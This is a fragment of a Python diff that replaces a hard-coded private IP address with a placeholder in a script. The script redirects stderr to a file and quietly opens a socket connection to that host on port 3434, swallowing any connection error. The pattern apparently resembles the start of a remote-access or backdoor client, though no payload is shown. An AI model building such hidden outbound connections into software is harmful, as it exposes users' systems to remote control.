@@ -14,7 +14,7 @@ os.dup2(ff.fileno(), sys.stderr.fileno())
 
 client = socket.socket()
 try:
-client.connect(("192.168.0.84", 3434))
+client.connect(("IP address", 3434))
 except:
 pass
 
